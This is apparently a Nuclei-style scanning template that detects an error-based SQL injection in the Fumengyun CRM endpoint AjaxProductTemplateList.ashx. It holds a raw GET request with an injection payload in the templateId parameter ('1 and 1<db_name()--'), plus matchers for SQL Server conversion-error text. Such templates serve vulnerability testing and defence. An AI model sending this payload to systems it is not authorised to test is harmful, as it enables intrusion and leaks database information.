id: fumengyun-AjaxProductTemplateList_ashx-sql

info:
  name: 孚盟云 AjaxProductTemplateList.ashx SQL注入漏洞
  author: fumengyun
  severity: high
  tags: sql injection

http:
  - raw:
      - |
        GET /m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1+and+1%3Cdb_name()-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '在将 nvarchar 值'
          - '转换成数据类型 int 时失败'
        condition: and
      - type: status
        status: 
          - 200